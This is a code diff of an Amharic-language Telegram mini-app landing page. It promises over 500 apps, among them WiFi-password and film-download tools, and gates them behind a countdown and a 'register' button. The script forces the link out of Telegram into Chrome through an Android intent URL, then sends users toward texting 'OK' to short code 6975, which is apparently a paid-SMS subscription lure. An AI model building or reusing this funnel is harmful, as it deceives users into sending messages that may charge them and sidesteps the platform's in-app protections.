@@ -1,88 +1,226 @@
 <!DOCTYPE html>
-<html lang="am">
+<html lang="am" dir="ltr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ምርጥ የአፖች ስብስብ</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>ምርጥ የአፖች ስብስብ | ይመዝገቡ</title>
+    
+    <!-- Telegram Web App SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
-</head>
-<body class="bg-[#050b18] text-white">
-    <div class="min-h-screen flex items-center justify-center p-6">
-        <div class="max-w-xl w-full text-center">
-            <div class="glass p-8 rounded-[2.5rem]">
-                <h2 class="text-2xl font-bold mb-6">ሊንኩን ለማግኘት ይመዝገቡ</h2>
-                
-                <div id="countdownBox" class="mb-8">
-                    <div class="text-6xl font-bold text-green-500" id="countdown">5</div>
-                    <p class="text-sm text-gray-400 mt-2">እባክዎ ይጠብቁ...</p>
-                </div>
-                
-                <button id="smsButton" disabled class="w-full py-4 bg-gray-600 text-white rounded-2xl font-bold text-lg opacity-50">
-                    <i class="fas fa-sms mr-2"></i> እየተዘጋጀ... 
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        const REDIRECT_URL = "https://addismobileapps.vercel.app/sms-redirect.html";
-        let countdown = 5;
-        const countdownEl = document.getElementById('countdown');
-        const smsButton = document.getElementById('smsButton');
-        
-        // Force external browser function
-        function forceExternalBrowser() {
-            if (window.Telegram && window.Telegram.WebApp) {
-                // CRITICAL: Close the mini app first
-                window.Telegram.WebApp.close();
-                
-                // Then open the redirect URL after mini app closes
-                setTimeout(() => {
-                    window.Telegram.WebApp.openLink(REDIRECT_URL, { try_browser: true });
-                }, 300);
-            } else {
-                // Regular browser
-                window.location.href = "sms:6975?body=OK";
-            }
-        }
-        
-        // Countdown timer
-        const timer = setInterval(() => {
-            countdown--;
-            countdownEl.textContent = countdown;
-            
-            if (countdown <= 0) {
-                clearInterval(timer);
-                countdownEl.textContent = "GO! ✓";
-                smsButton.disabled = false;
-                smsButton.classList.remove('bg-gray-600', 'opacity-50');
-                smsButton.classList.add('bg-green-600', 'hover:bg-green-500');
-                smsButton.innerHTML = '<i class="fas fa-sms mr-2"></i> አሁን ይመዝገቡ';
-            }
-        }, 1000);
-        
-        // Button click handler
-        smsButton.addEventListener('click', function() {
-            if (!smsButton.disabled) {
-                forceExternalBrowser();
-            }
-        });
-        
-        // Expand Telegram WebApp
-        if (window.Telegram?.WebApp) {
-            window.Telegram.WebApp.expand();
-            window.Telegram.WebApp.ready();
-        }
-    </script>
     
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Ethiopic:wght@100..900&display=swap');
+        body { font-family: 'Noto Sans Ethiopic', sans-serif; }
         .glass {
             background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(12px);
             border: 1px solid rgba(255, 255, 255, 0.1);
         }
+        .gradient-text {
+            background: linear-gradient(90deg, #00d2ff 0%, #3a7bd5 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        #timer-circle {
+            transition: stroke-dashoffset 1s linear;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        .pulse-animation {
+            animation: pulse 0.5s ease-in-out 3;
+        }
     </style>
+</head>
+<body class="bg-[#050b18] text-white min-h-screen flex flex-col items-center justify-center p-6 overflow-hidden">
+
+    <div class="max-w-xl w-full text-center space-y-8">
+        <!-- Main Title -->
+        <div class="space-y-4">
+            <h1 class="text-4xl md:text-5xl font-black leading-tight">
+                ከ500 በላይ <span class="gradient-text">ድንቅ አፖች</span>
+            </h1>
+            <p class="text-gray-400">የትም የማይገኙ ምርጥ አፕሊኬሽኖችን ለማግኘት ተዘጋጅተዋል?</p>
+        </div>
+
+        <!-- Features List -->
+        <div class="grid grid-cols-2 gap-4 py-2">
+            <div class="glass p-4 rounded-2xl flex items-center space-x-4 rtl:space-x-reverse">
+                <div class="bg-blue-500/20 p-3 rounded-xl"><i class="fas fa-magic text-blue-400"></i></div>
+                <span class="text-sm font-medium">የስልክ ማሳመሪያ</span>
+            </div>
+            <div class="glass p-4 rounded-2xl flex items-center space-x-4 rtl:space-x-reverse">
+                <div class="bg-purple-500/20 p-3 rounded-xl"><i class="fas fa-film text-purple-400"></i></div>
+                <span class="text-sm font-medium">የፊልም ማውረጃ</span>
+            </div>
+            <div class="glass p-4 rounded-2xl flex items-center space-x-4 rtl:space-x-reverse">
+                <div class="bg-green-500/20 p-3 rounded-xl"><i class="fas fa-trash-restore text-green-400"></i></div>
+                <span class="text-sm font-medium">የጠፋ ፋይል ማግኛ</span>
+            </div>
+            <div class="glass p-4 rounded-2xl flex items-center space-x-4 rtl:space-x-reverse">
+                <div class="bg-red-500/20 p-3 rounded-xl"><i class="fas fa-wifi text-red-400"></i></div>
+                <span class="text-sm font-medium">የዋይፋይ ፓስወርድ</span>
+            </div>
+        </div>
+
+        <!-- SMS Verification Box -->
+        <div class="glass p-8 rounded-[2.5rem] shadow-2xl relative">
+            <h2 class="text-xl font-bold mb-6">ሊንኩን ለማግኘት ይመዝገቡ</h2>
+            
+            <!-- Countdown Timer -->
+            <div class="relative flex items-center justify-center mb-8">
+                <svg class="w-24 h-24 transform -rotate-90">
+                    <circle class="text-gray-800" stroke-width="6" stroke="currentColor" fill="transparent" r="45" cx="48" cy="48" />
+                    <circle class="text-blue-500" stroke-width="6" stroke-dasharray="283" stroke-dashoffset="0" stroke-linecap="round" stroke="currentColor" fill="transparent" r="45" cx="48" cy="48" id="timer-circle" />
+                </svg>
+                <span id="countdown" class="absolute text-3xl font-black italic">5</span>
+            </div>
+
+            <!-- SMS Button -->
+            <button id="smsButton" class="w-full py-4 bg-gray-600 text-white rounded-2xl font-bold text-lg transition-all transform shadow-xl mb-4 opacity-50 cursor-not-allowed" disabled>
+                <i class="fas fa-hourglass-half mr-2"></i> እባክዎ ይጠብቁ...
+            </button>
+            
+            <p class="text-[12px] text-gray-400" id="instructionText">
+                ቁልፉ ከቆጠራው በኋላ ይንቀሳቀሳል
+            </p>
+        </div>
+
+        <!-- Footer -->
+        <div class="flex justify-center items-center space-x-4 text-xs text-gray-500 tracking-widest uppercase">
+            <span>አስተማማኝ</span>
+            <div class="w-1 h-1 bg-gray-700 rounded-full"></div>
+            <span>ፈጣን</span>
+            <div class="w-1 h-1 bg-gray-700 rounded-full"></div>
+            <span>ነፃ</span>
+        </div>
+    </div>
+
+    <script>
+        // Configuration for Android
+        const REDIRECT_PAGE_URL = "https://addismobileapps.vercel.app/sms-redirect.html";
+        
+        let timeLeft = 5;
+        let countdownActive = true;
+        let smsButton = document.getElementById('smsButton');
+        let countdownElement = document.getElementById('countdown');
+        let circle = document.getElementById('timer-circle');
+        let totalDash = 283;
+        let timer;
+
+        // Initialize Telegram WebApp
+        let tg = window.Telegram.WebApp;
+        tg.expand(); // Expand to full screen
+        tg.ready();
+
+        // Function to force open in Chrome browser (Android only)
+        function forceOpenInChrome(url) {
+            // Detect if user is on Android
+            const isAndroid = /Android/i.test(navigator.userAgent);
+            
+            if (isAndroid && window.Telegram && window.Telegram.WebApp) {
+                try {
+                    // Method 1: Chrome intent (most reliable for Android)
+                    const chromeIntent = `intent://${url.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
+                    window.Telegram.WebApp.openLink(chromeIntent, { try_browser: true });
+                } catch (e) {
+                    // Fallback method
+                    window.Telegram.WebApp.openLink(url, { try_browser: true });
+                }
+                
+                // Close the mini app after attempting to open Chrome
+                setTimeout(() => {
+                    tg.close();
+                }, 500);
+            } else if (window.Telegram && window.Telegram.WebApp) {
+                // Non-Android fallback
+                window.Telegram.WebApp.openLink(url, { try_browser: true });
+            } else {
+                // Regular browser fallback
+                window.location.href = url;
+            }
+        }
+
+        // Main function to open SMS via redirect page in Chrome
+        function openSMSWithRedirect() {
+            // First show visual feedback
+            smsButton.classList.add('pulse-animation');
+            
+            // Update button text
+            const originalText = smsButton.innerHTML;
+            smsButton.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> በChrome እየከፈተ...';
+            
+            // Force open in Chrome
+            forceOpenInChrome(REDIRECT_PAGE_URL);
+            
+            // Reset button after delay (though app might close)
+            setTimeout(() => {
+                smsButton.innerHTML = originalText;
+                smsButton.classList.remove('pulse-animation');
+            }, 2000);
+        }
+
+        // Start countdown timer
+        function startCountdown() {
+            timer = setInterval(() => {
+                if (timeLeft <= 1) {
+                    clearInterval(timer);
+                    countdownActive = false;
+                    countdownElement.textContent = "GO!";
+                    
+                    // Enable button with green color
+                    smsButton.disabled = false;
+                    smsButton.classList.remove('bg-gray-600', 'opacity-50', 'cursor-not-allowed');
+                    smsButton.classList.add('bg-green-600', 'hover:bg-green-500', 'cursor-pointer');
+                    smsButton.innerHTML = '<i class="fas fa-sms mr-2"></i> አሁኑኑ ይመዝገቡ';
+                    
+                    // Update instruction text
+                    document.getElementById('instructionText').innerHTML = '✅ አሁን ቁልፉን መጫን ይችላሉ! Chrome ላይ ይከፈታል';
+                    
+                    // Add pulse animation to button
+                    smsButton.classList.add('pulse-animation');
+                    setTimeout(() => {
+                        smsButton.classList.remove('pulse-animation');
+                    }, 1500);
+                } else {
+                    timeLeft--;
+                    countdownElement.textContent = timeLeft;
+                    const offset = totalDash - (timeLeft / 5) * totalDash;
+                    circle.style.strokeDashoffset = offset;
+                }
+            }, 1000);
+        }
+
+        // Handle button click
+        smsButton.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            if (countdownActive) {
+                // Show warning if countdown not finished
+                tg.showAlert("እባክዎ ቆጠራው እስኪያልቅ ይጠብቁ!");
+                return;
+            }
+            
+            // Open SMS in Chrome
+            openSMSWithRedirect();
+        });
+
+        // Start everything
+        startCountdown();
+        
+        // Show welcome message for Android users only
+        if (/Android/i.test(navigator.userAgent)) {
+            setTimeout(() => {
+                tg.showPopup({
+                    title: "📱 እንኳን ደህና መጡ!",
+                    message: "አፕሊኬሽኖቹን ለማግኘት በ Chrome ብራውዘር ይከፈታል\n\nቁጥር: 6975\nመልዕክት: OK",
+                    buttons: [{ type: "ok" }]
+                });
+            }, 500);
+        }
+    </script>
 </body>
 </html>
